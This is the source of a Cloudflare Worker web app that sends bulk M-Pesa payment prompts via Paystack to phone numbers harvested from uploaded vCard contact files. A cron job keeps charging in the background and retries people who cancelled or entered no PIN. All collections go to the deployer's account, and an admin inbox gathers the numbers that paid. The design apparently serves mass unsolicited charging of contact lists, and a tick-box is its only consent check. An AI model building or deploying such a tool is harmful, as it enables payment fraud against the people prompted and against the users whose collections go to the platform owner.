// Race Payments - multi-user. All collections go to YOUR Paystack account.
// Secrets: PAYSTACK_SECRET_KEY, ADMIN_PASSWORD (also the "admin" login). Optional vars: AMOUNT (default 100), MAX_AMOUNT (default 1000)
// Binding: KV. Cron trigger: */1 * * * *

const HTML = `<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Race Payments</title>
<style>
:root{--g:#00a650;--d:#007a3b;--l:#e6f5ec;--bg:#eef5f0;--c:#fff;--t:#14231a;--m:#66786d;--sh:0 4px 16px #0a3d1f14}
@media(prefers-color-scheme:dark){:root{--l:#143324;--bg:#0c1711;--c:#14251b;--t:#e6f2ea;--m:#8fa597;--sh:0 4px 16px #0006}}
*{box-sizing:border-box}body{margin:0;font-family:system-ui,-apple-system,Segoe UI,sans-serif;background:var(--bg);color:var(--t)}
header{background:linear-gradient(135deg,#00a650,#006b35);color:#fff;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:5;box-shadow:var(--sh)}
.brand{font-size:15px;font-weight:800;letter-spacing:5px;background:linear-gradient(90deg,#fff,#b8ffd6,#fff,#ffe58a,#fff);background-size:300% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:sh 4s linear infinite}
@keyframes sh{to{background-position:-300% 0}}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#7dffb0;margin-right:8px;animation:pl 1.6s ease-in-out infinite}
@keyframes pl{50%{transform:scale(1.6);opacity:.4}}
header h1{margin:2px 0 0;font-size:12px;font-weight:500;opacity:.9}
main{max-width:820px;margin:0 auto;padding:14px}
.card{background:var(--c);border-radius:16px;padding:16px;margin-bottom:14px;box-shadow:var(--sh)}.card h3{margin:0 0 6px;font-size:16px}
.tiles{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:14px}.t4{grid-template-columns:repeat(2,1fr)}
@media(min-width:640px){.tiles{grid-template-columns:repeat(6,1fr)}.t4{grid-template-columns:repeat(4,1fr)}}
.tile{background:var(--c);border-radius:14px;padding:12px 6px;text-align:center;box-shadow:var(--sh);border-top:4px solid var(--k,#8a9a90)}.tile b{display:block;font-size:22px}.tile span{font-size:11px;color:var(--m)}
input,textarea{width:100%;padding:11px 12px;border:1.5px solid #8884;border-radius:10px;background:transparent;color:inherit;font-size:15px;margin:5px 0;outline:none}
input:focus,textarea:focus{border-color:var(--g)}input[type=checkbox]{width:auto;margin-right:6px}
button{background:var(--g);color:#fff;border:0;border-radius:10px;padding:10px 16px;font-size:14px;font-weight:600;cursor:pointer;margin:5px 5px 0 0;transition:.15s}
button:hover{filter:brightness(1.08);transform:translateY(-1px)}button.s,.tabs button{background:var(--l);color:var(--d)}.tabs button.on{background:var(--g);color:#fff}header button{background:#fff3;color:#fff;margin:0}
.tw{overflow-x:auto;max-height:50vh;overflow-y:auto}table{width:100%;border-collapse:collapse;font-size:14px}td,th{padding:8px 6px;text-align:left;border-bottom:1px solid #8882}
.tag{padding:3px 9px;border-radius:99px;font-size:12px;color:#fff}.new{background:#8a9a90}.queued{background:#6c7a89}.sent{background:#e69b00}.paid{background:var(--g)}.failed{background:#d33}.cancelled{background:#8e44ad}.nopin{background:#2c7be5}
.m{font-size:13px;color:var(--m);margin-top:6px}a.m{color:var(--d);display:inline-block;margin-top:10px}[hidden]{display:none!important}
</style></style></head><body>
<header><div><div class="brand"><span class="dot"></span>LUNZALU</div><h1>Race Payments</h1></div><button id="out" hidden>Log out</button></header>
<main>
<div class="card" id="auth"><h3>Welcome</h3><p class="m">Log in or create an account to send M-Pesa prompts.</p>
<input id="em" type="email" placeholder="Email" autocomplete="username"><input id="pw" type="password" placeholder="Password (8+ characters)" autocomplete="current-password">
<label class="m"><input type="checkbox" id="tm">I will only prompt people who agreed to be contacted for this payment.</label><br>
<button id="li">Log in</button><button id="rg" class="s">Create account</button><br><a href="#" id="fg" class="m">Forgot password?</a><div class="m" id="am"></div></div>
<div class="card" id="rs" hidden><h3>Reset password</h3><p class="m">Ask the admin for a reset code, then enter it here.</p>
<input id="re" type="email" placeholder="Your email"><input id="rc" placeholder="Reset code"><input id="rp" type="password" placeholder="New password (8+ characters)">
<button id="rb">Set new password</button><button id="rx" class="s">Back</button><div class="m" id="rm"></div></div>

<div id="adm" hidden>
<div class="tiles t4"><div class="tile" style="--k:#2c7be5"><b id="a0">0</b><span>Users</span></div><div class="tile" style="--k:#00a650"><b id="a1">0</b><span>Paid prompts</span></div><div class="tile" style="--k:#e69b00"><b id="a2">0</b><span>Collected (KES)</span></div><div class="tile" style="--k:#8e44ad"><b id="a3">0</b><span>Inbox</span></div></div>
<div class="tabs"><button id="t1" class="on">Inbox</button><button id="t2">Users</button></div>
<div class="card" id="ib"><h3>Inbox: paid numbers only</h3><button id="cp" class="s">Copy numbers</button><button id="ci" class="s">Clear inbox</button>
<div class="tw"><table><thead><tr><th>Time</th><th>Number</th><th>Name</th><th>User</th><th>KES</th></tr></thead><tbody id="ibb"></tbody></table></div></div>
<div class="card" id="us" hidden><h3>Users</h3><div class="m">First 20 shown. Collected = paid prompts, before Paystack fees.</div>
<div class="tw"><table><thead><tr><th>Email</th><th>Contacts</th><th>Paid</th><th>Collected</th><th></th></tr></thead><tbody id="ub"></tbody></table></div></div></div>

<div id="app" hidden>
<div class="tiles"><div class="tile"><b id="n0">0</b><span>Total</span></div><div class="tile" style="--k:#e69b00"><b id="n1">0</b><span>Waiting</span></div><div class="tile" style="--k:#00a650"><b id="n2">0</b><span>Paid</span></div><div class="tile" style="--k:#8e44ad"><b id="n3">0</b><span>Cancelled</span></div><div class="tile" style="--k:#2c7be5"><b id="n4">0</b><span>No PIN entered</span></div><div class="tile" style="--k:#d33"><b id="n5">0</b><span>Failed</span></div></div>
<div class="card"><h3>Add contacts</h3><input type="file" id="f" multiple accept=".vcf,text/vcard,text/x-vcard">
<textarea id="qt" rows="3" placeholder="Or type up to 50 numbers, one per line, e.g. Jane, 0712345678"></textarea><button id="qa" class="s">Add numbers</button><div class="m" id="msg"></div></div>
<div class="card"><h3>Send</h3><button id="send">Send prompts</button><button id="stop" class="s" hidden>Stop</button><button id="retry" class="s">Retry unpaid</button><button id="csv" class="s">Export CSV</button><button id="clr" class="s">Clear</button><div class="m" id="st"></div></div>
<div class="card"><h3>Amount per prompt (KES)</h3><input id="am2" type="number" min="10"><button id="sv" class="s">Save amount</button><div class="m" id="mx"></div></div>
<div class="card tw"><table><thead><tr><th>Name</th><th>Phone</th><th>Status</th></tr></thead><tbody id="tb"></tbody></table></div>
</div></main>
<script>
var L=[],run=false,amt=100,IB=[],$=function(i){return document.getElementById(i)};
var tok=localStorage.getItem("tok")||"",adm=localStorage.getItem("adm")==="1";
var LB={new:"Not sent",queued:"Queued",sent:"Waiting",paid:"Paid",failed:"Failed",cancelled:"Cancelled",nopin:"No PIN entered"};
function say(t){$("msg").textContent=t}
function esc(s){return String(s).replace(/[&<>"']/g,function(c){return "&#"+c.charCodeAt(0)+";"})}
function norm(p){var d=p.replace(/[^\\d+]/g,"");if(d[0]==="+")d=d.slice(1);
if(/^0[71]\\d{8}$/.test(d))d="254"+d.slice(1);else if(/^[71]\\d{8}$/.test(d))d="254"+d;
return /^254[71]\\d{8}$/.test(d)?"+"+d:null}
function api(p,b){return fetch(p,{method:"POST",headers:{"content-type":"application/json","x-auth":tok},body:JSON.stringify(b||{})}).then(function(r){return r.json().then(function(j){j._h=r.status;return j})})}
function view(){var on=!!tok;$("auth").hidden=on;$("rs").hidden=true;$("out").hidden=!on;$("adm").hidden=!(on&&adm);$("app").hidden=!(on&&!adm);if(on)load()}
function logout(){tok="";adm=false;localStorage.removeItem("tok");localStorage.removeItem("adm");L=[];view()}
$("out").onclick=logout;
async function go(mode){var em=$("em").value.trim(),pw=$("pw").value;
if(mode==="register"&&!$("tm").checked){$("am").textContent="Please tick the box to agree.";return}
var j=await api("/api/"+mode,{email:em,password:pw});
if(!j.token){$("am").textContent=j.message||"Failed.";return}
tok=j.token;adm=!!j.admin;localStorage.setItem("tok",tok);localStorage.setItem("adm",adm?"1":"0");$("pw").value="";$("am").textContent="";view()}
$("li").onclick=function(){go("login")};$("rg").onclick=function(){go("register")};
function render(){var c={};L.forEach(function(x){c[x.s]=(c[x.s]||0)+1});
$("tb").innerHTML=L.map(function(x){return "<tr><td>"+esc(x.n||"-")+"</td><td>"+x.p+"</td><td><span class='tag "+x.s+"' title='"+esc(x.e||"")+"'>"+(LB[x.s]||x.s)+"</span></td></tr>"}).join("");
$("n0").textContent=L.length;$("n1").textContent=(c.sent||0)+(c.queued||0);$("n2").textContent=c.paid||0;$("n3").textContent=c.cancelled||0;$("n4").textContent=c.nopin||0;$("n5").textContent=c.failed||0;
$("st").textContent=(run&&c.queued)?"Sending in the background: "+c.queued+" left. You can close the app.":"";$("stop").hidden=!run}
async function load(){if(!tok)return;try{
if(adm){var a=await api("/api/admin/users"),ix=await api("/api/admin/inbox");if(a._h===401)return logout();
var rows=a.rows||[],pd=0,sm=0;rows.forEach(function(r){pd+=r.paid;sm+=r.sum});IB=ix.items||[];
$("a0").textContent=rows.length;$("a1").textContent=pd;$("a2").textContent=sm;$("a3").textContent=IB.length;
$("ibb").innerHTML=IB.map(function(x){return "<tr><td>"+new Date(x.t).toLocaleString()+"</td><td>"+x.p+"</td><td>"+esc(x.n||"-")+"</td><td>"+esc(x.u)+"</td><td>"+x.a+"</td></tr>"}).join("")||"<tr><td colspan='5' class='m'>No paid numbers yet.</td></tr>";
$("ub").innerHTML=rows.map(function(r){return "<tr><td>"+esc(r.email)+"</td><td>"+r.contacts+"</td><td>"+r.paid+"</td><td>KES "+r.sum+"</td><td><button class='s' onclick=\\"blk('"+esc(r.email)+"',"+(!r.blocked)+")\\">"+(r.blocked?"Unblock":"Block")+"</button><button class='s' onclick=\\"rst('"+esc(r.email)+"')\\">Reset</button></td></tr>"}).join("");return}
var j=await api("/api/state");if(j._h===401||j._h===403)return logout();L=j.list||[];run=!!j.run;
if(document.activeElement!==$("am2"))$("am2").value=j.amount;amt=j.amount;$("mx").textContent="Allowed: KES 10 to "+j.max+". Money is collected into the platform owner's account.";render()}catch(e){}}
async function rst(e){var j=await api("/api/admin/reset",{email:e});if(j.code)prompt("Give this one-time code to the user (valid 24 hours):",j.code);else alert(j.message||"Failed")}
$("fg").onclick=function(e){e.preventDefault();$("auth").hidden=true;$("rs").hidden=false;$("re").value=$("em").value};
$("rx").onclick=function(){$("rs").hidden=true;$("auth").hidden=false};
$("rb").onclick=async function(){var j=await api("/api/forgot",{email:$("re").value,code:$("rc").value,password:$("rp").value});
$("rm").textContent=j.ok?"Password changed. You can log in now.":(j.message||"Failed.");if(j.ok){$("rc").value=$("rp").value="";setTimeout(function(){$("rx").onclick()},1500)}};
$("t1").onclick=function(){$("ib").hidden=false;$("us").hidden=true;$("t1").className="on";$("t2").className=""};
$("t2").onclick=function(){$("ib").hidden=true;$("us").hidden=false;$("t2").className="on";$("t1").className=""};
$("cp").onclick=function(){navigator.clipboard.writeText(IB.map(function(x){return x.p}).join("\\n")).then(function(){alert("Copied "+IB.length+" numbers")})};
$("ci").onclick=function(){if(confirm("Clear the inbox?"))api("/api/admin/inbox_clear").then(load)};
function blk(e,b){api("/api/admin/block",{email:e,blocked:b}).then(load)}
$("sv").onclick=function(){api("/api/settings",{amount:$("am2").value}).then(function(j){say("Amount set to KES "+j.amount);load()})};
async function add(cs,bad,n){say("Uploading "+cs.length+" contacts...");
var j=await api("/api/add",{contacts:cs});if(j._h===401)return logout();
say(n+": "+(j.added||0)+" added, "+(cs.length-(j.added||0))+" already in the list, "+bad+" invalid numbers skipped.");load()}
$("f").onchange=async function(){var fs=Array.from(this.files),cs=[],bad=0,seen={};
for(var f of fs){var txt=await f.text();
txt.split(/BEGIN:VCARD/i).slice(1).forEach(function(card){
var nm=(card.match(/^FN[^:]*:(.*)$/im)||[])[1]||"";var re=/^(?:item\\d+\\.)?TEL[^:]*:(.+)$/gim,m;
while((m=re.exec(card))){var p=norm(m[1].trim());if(!p){bad++;continue}if(seen[p])continue;seen[p]=1;cs.push({n:nm.trim(),p:p})}})}
this.value="";add(cs,bad,fs.length+" file(s)")};
$("qa").onclick=function(){var cs=[],bad=0,seen={},ls=$("qt").value.split(/\\n/).filter(function(l){return l.trim()});
if(ls.length>50){say("Maximum 50 numbers at a time.");return}
ls.forEach(function(l){var m=l.match(/(\\+?\\d[\\d\\s-]{8,})\\s*$/),p=m&&norm(m[1]);if(!p){bad++;return}if(seen[p])return;seen[p]=1;cs.push({n:l.slice(0,m.index).replace(/[,;:\\s]+$/,""),p:p})});
$("qt").value="";add(cs,bad,"Typed numbers")};
function start(mode){var st=mode==="retry"?["failed","cancelled","nopin"]:["new","queued"];
var n=L.filter(function(x){return st.indexOf(x.s)>-1}).length;if(!n){say("Nobody to prompt.");return}
if(!confirm("Send a KES "+amt+" prompt to "+n+" people? It keeps sending in the background."))return;
api("/api/run",{mode:mode}).then(function(){say("Started. Prompts go out in the background, even if you close the app.");load()})}
$("send").onclick=function(){start("new")};$("retry").onclick=function(){start("retry")};
$("stop").onclick=function(){api("/api/stop").then(function(){say("Stopped. Press Send prompts to continue.");load()})};
$("clr").onclick=function(){if(confirm("Delete the whole list?"))api("/api/clear").then(function(){say("");load()})};
$("csv").onclick=function(){var t="Name,Phone,Status\\n"+L.map(function(x){return '"'+(x.n||"").replace(/"/g,'""')+'",'+x.p+","+(LB[x.s]||x.s)}).join("\\n");
var a=document.createElement("a");a.href=URL.createObjectURL(new Blob([t],{type:"text/csv"}));a.download="payments.csv";a.click()};
setInterval(load,8000);view();
</script></body></html>`;

const J = { "content-type": "application/json" };
const out = (o, s = 200) => new Response(JSON.stringify(o), { status: s, headers: J });
const rd = async (env, e) => JSON.parse((await env.KV.get("l:" + e)) || "[]");
const wr = (env, e, L) => env.KV.put("l:" + e, JSON.stringify(L));
const getU = async (env, e) => JSON.parse((await env.KV.get("u:" + e)) || "null");
const putU = (env, e, u) => env.KV.put("u:" + e, JSON.stringify(u));
const auth = (env) => ({ Authorization: "Bearer " + env.PAYSTACK_SECRET_KEY });
async function patch(env, e, ups) {
  const L = await rd(env, e), m = new Map(ups.map((u) => [u.p, u]));
  for (const x of L) { const u = m.get(x.p); if (u) Object.assign(x, u); }
  await wr(env, e, L);
}
async function setActive(env, e, on) {
  let a = JSON.parse((await env.KV.get("active")) || "[]").filter((x) => x !== e);
  if (on) a.push(e);
  await env.KV.put("active", JSON.stringify(a));
}

// ---- passwords and login tokens ----
const enc = new TextEncoder();
const b64 = (b) => btoa(String.fromCharCode(...new Uint8Array(b))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
async function hmac(key, msg) {
  const k = await crypto.subtle.importKey("raw", enc.encode(key), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  return b64(await crypto.subtle.sign("HMAC", k, enc.encode(msg)));
}
// 10,000 rounds keeps CPU low enough for Cloudflare's free plan; raise to 100000 on a paid plan
async function hash(pw, salt) {
  const k = await crypto.subtle.importKey("raw", enc.encode(pw), "PBKDF2", false, ["deriveBits"]);
  return b64(await crypto.subtle.deriveBits({ name: "PBKDF2", salt: enc.encode(salt), iterations: 10000, hash: "SHA-256" }, k, 256));
}
async function mkTok(env, e) { const exp = Date.now() + 30 * 864e5; return btoa(e) + "." + exp + "." + (await hmac(env.ADMIN_PASSWORD, e + "|" + exp)); }
async function who(env, req) {
  const t = (req.headers.get("x-auth") || "").split(".");
  if (t.length !== 3) return null;
  let e; try { e = atob(t[0]); } catch (_) { return null; }
  if (Date.now() > +t[1] || (await hmac(env.ADMIN_PASSWORD, e + "|" + t[1])) !== t[2]) return null;
  return e;
}

// ---- Paystack ----
async function charge(env, p, ref, amount) {
  try {
    const r = await fetch("https://api.paystack.co/charge", {
      method: "POST", headers: { ...auth(env), "content-type": "application/json" },
      body: JSON.stringify({ email: p.slice(1) + "@racepay.app", amount: amount * 100, currency: "KES", reference: ref, mobile_money: { phone: p, provider: "mpesa" } }),
    });
    const j = await r.json();
    if (j.status === false || (j.data && j.data.status === "failed")) return { p, s: "failed", e: j.message || (j.data && j.data.message) || "Failed" };
    return null;
  } catch (_) { return { p, s: "failed", e: "Network error" }; }
}
async function verify(env, x) {
  try {
    const r = await fetch("https://api.paystack.co/transaction/verify/" + encodeURIComponent(x.ref), { headers: auth(env) });
    const d = ((await r.json()).data) || {}, st = d.status, g = ((d.gateway_response || "") + " " + (d.message || "")).trim();
    if (st === "success") return { p: x.p, s: "paid", e: "" };
    if (st === "failed" || st === "abandoned") {
      const s = /cancel/i.test(g) ? "cancelled" : (st === "abandoned" || /timeout|timed out|no response|not respond|expired/i.test(g)) ? "nopin" : "failed";
      return { p: x.p, s, e: g || st };
    }
    if (x.t && Date.now() - x.t > 240000) return { p: x.p, s: "nopin", e: "No PIN entered" };
  } catch (_) {}
  return null;
}

export default {
  async fetch(req, env) {
    const p = new URL(req.url).pathname;
    if (p === "/") return new Response(HTML, { headers: { "content-type": "text/html;charset=utf-8" } });
    if (req.method !== "POST" || !p.startsWith("/api/")) return new Response("Not found", { status: 404 });
    if (!env.ADMIN_PASSWORD) return out({ message: "Server not set up." }, 500);
    const b = await req.json().catch(() => ({}));
    const MAX = +env.MAX_AMOUNT || 1000, DEF = +env.AMOUNT || 100;
    const em = String(b.email || "").trim().toLowerCase();

    if (p === "/api/register") {
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em) || em.length > 80) return out({ message: "Enter a valid email." }, 400);
      if (String(b.password || "").length < 8) return out({ message: "Password must be at least 8 characters." }, 400);
      if (await getU(env, em)) return out({ message: "That email is already registered." }, 409);
      const salt = crypto.randomUUID();
      await putU(env, em, { salt, h: await hash(String(b.password), salt), amount: DEF, run: false, blocked: false, at: Date.now() });
      const us = JSON.parse((await env.KV.get("users")) || "[]"); us.push(em);
      await env.KV.put("users", JSON.stringify(us));
      return out({ token: await mkTok(env, em) });
    }
    if (p === "/api/login") {
      if (em === "admin") return b.password === env.ADMIN_PASSWORD ? out({ token: await mkTok(env, "admin"), admin: true }) : out({ message: "Wrong email or password." }, 401);
      const u = await getU(env, em);
      if (!u || (await hash(String(b.password || ""), u.salt)) !== u.h) return out({ message: "Wrong email or password." }, 401);
      if (u.blocked) return out({ message: "This account is blocked." }, 403);
      return out({ token: await mkTok(env, em) });
    }

    if (p === "/api/forgot") {
      const u = await getU(env, em);
      if (!u || !u.rc || Date.now() > u.rx || (await hash(String(b.code || "").trim().toUpperCase(), u.salt)) !== u.rc) return out({ message: "Invalid or expired reset code." }, 400);
      if (String(b.password || "").length < 8) return out({ message: "Password must be at least 8 characters." }, 400);
      u.h = await hash(String(b.password), u.salt); delete u.rc; delete u.rx; await putU(env, em, u);
      return out({ ok: true });
    }

    const e = await who(env, req);
    if (!e) return out({ message: "Please log in." }, 401);

    if (e === "admin") {
      if (p === "/api/admin/users") {
        const us = JSON.parse((await env.KV.get("users")) || "[]").slice(0, 20);
        const rows = await Promise.all(us.map(async (x) => {
          const u = (await getU(env, x)) || {}, L = await rd(env, x), pd = L.filter((i) => i.s === "paid");
          return { email: x, blocked: !!u.blocked, contacts: L.length, paid: pd.length, sum: pd.reduce((s, i) => s + (i.a || 0), 0) };
        }));
        return out({ rows });
      }
      if (p === "/api/admin/block") {
        const u = await getU(env, String(b.email || ""));
        if (u) { u.blocked = !!b.blocked; u.run = false; await putU(env, b.email, u); if (u.blocked) await setActive(env, b.email, false); }
        return out({ ok: true });
      }
      if (p === "/api/admin/reset") {
        const x = String(b.email || ""), u = await getU(env, x);
        if (!u) return out({ message: "No such user." }, 404);
        const code = Array.from(crypto.getRandomValues(new Uint8Array(8)), (c) => "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"[c % 32]).join("");
        u.rc = await hash(code, u.salt); u.rx = Date.now() + 864e5; await putU(env, x, u);
        return out({ code });
      }
      if (p === "/api/admin/inbox") return out({ items: JSON.parse((await env.KV.get("inbox")) || "[]").reverse() });
      if (p === "/api/admin/inbox_clear") { await env.KV.put("inbox", "[]"); return out({ ok: true }); }
      return out({ message: "Not allowed" }, 403);
    }

    const u = await getU(env, e);
    if (!u) return out({ message: "Please log in." }, 401);
    if (u.blocked) return out({ message: "Blocked." }, 403);

    if (p === "/api/state") return out({ list: await rd(env, e), run: u.run, amount: u.amount, max: MAX });
    if (p === "/api/settings") {
      u.amount = Math.max(10, Math.min(MAX, Math.round(+b.amount || DEF)));
      await putU(env, e, u); return out({ amount: u.amount });
    }
    if (p === "/api/add") {
      const L = await rd(env, e), seen = new Set(L.map((x) => x.p));
      let added = 0;
      for (const c of b.contacts || []) {
        if (/^\+254[71]\d{8}$/.test(c.p) && !seen.has(c.p)) { seen.add(c.p); L.push({ n: String(c.n || "").slice(0, 60), p: c.p, s: "new" }); added++; }
      }
      await wr(env, e, L); return out({ added });
    }
    if (p === "/api/run") {
      const want = b.mode === "retry" ? ["failed", "cancelled", "nopin"] : ["new"];
      const L = await rd(env, e);
      for (const x of L) if (want.includes(x.s)) x.s = "queued";
      await wr(env, e, L); u.run = true; await putU(env, e, u); await setActive(env, e, true);
      return out({ ok: true });
    }
    if (p === "/api/stop") { u.run = false; await putU(env, e, u); return out({ ok: true }); }
    if (p === "/api/clear") { await env.KV.delete("l:" + e); u.run = false; await putU(env, e, u); await setActive(env, e, false); return out({ ok: true }); }
    return new Response("Not found", { status: 404 });
  },

  // Every minute: verifies pending payments and sends the next prompts for users who pressed Send.
  async scheduled(ev, env) {
    const a = JSON.parse((await env.KV.get("active")) || "[]");
    if (!a.length) return;
    let n = 1; const st = Math.floor(Date.now() / 60000) % a.length, done = [];
    for (let i = 0; i < a.length && n <= 24; i++) {
      const e = a[(st + i) % a.length], u = await getU(env, e); n++;
      if (!u || u.blocked) { done.push(e); continue; }
      const L = await rd(env, e); n++;
      const ups = []; let v = 0;
      for (const x of L) {
        if (v >= 5) break;
        if (x.s === "sent" && x.ref) { v++; n++; const r = await verify(env, x); if (r) { ups.push(r); Object.assign(x, r); } }
      }
      if (ups.length) { await patch(env, e, ups); n += 2; }
      const pn = L.filter((x) => ups.some((r) => r.p === x.p && r.s === "paid"));
      if (pn.length) { // paid numbers go to the admin inbox
        const ib = JSON.parse((await env.KV.get("inbox")) || "[]");
        pn.forEach((x) => ib.push({ u: e, p: x.p, n: x.n, a: x.a || 0, t: Date.now() }));
        await env.KV.put("inbox", JSON.stringify(ib.slice(-300))); n += 2;
      }
      if (u.run) {
        const batch = L.filter((x) => x.s === "queued").slice(0, 9), now = Date.now(), amt = u.amount || 100;
        if (batch.length) {
          const marks = batch.map((x) => ({ p: x.p, s: "sent", e: "", ref: "hr-" + x.p.slice(1) + "-" + now, t: now, a: amt }));
          await patch(env, e, marks); n += 2;      // marked BEFORE charging so nobody is prompted twice
          marks.forEach((m, j) => Object.assign(batch[j], m));
          const res = [];
          for (const x of batch) { n++; const r = await charge(env, x.p, x.ref, amt); if (r) { res.push(r); Object.assign(x, r); } }
          if (res.length) { await patch(env, e, res); n += 2; }
        }
      }
      if (L.every((x) => x.s !== "sent" && (x.s !== "queued" || !u.run))) done.push(e);
    }
    if (done.length) {
      const f = JSON.parse((await env.KV.get("active")) || "[]");
      await env.KV.put("active", JSON.stringify(f.filter((x) => !done.includes(x))));
    }
  },
};
